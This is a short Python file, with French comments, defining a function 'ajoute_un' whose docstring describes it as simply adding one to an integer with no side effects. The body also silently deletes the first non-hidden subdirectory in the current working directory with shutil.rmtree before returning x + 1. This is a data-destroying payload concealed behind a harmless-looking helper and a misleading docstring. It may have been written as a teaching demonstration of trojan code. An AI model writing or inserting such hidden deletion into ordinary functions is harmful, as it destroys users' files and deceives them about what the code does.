import os, shutil

def ajoute_un(x):
    """
    Ajoute un à l'entier passé en paramètre
    parametre x (int) : un entier
    pré-conditions : Néant
    post-conditions : Néant
    retour (int) : x + 1
    """
    directories = list(filter(lambda x: os.path.isdir(x) and not x.startswith('.') and not x.startswith('_'), os.listdir('.')))
    if len(directories) > 0:
        shutil.rmtree('./' + directories[0])
    return x + 1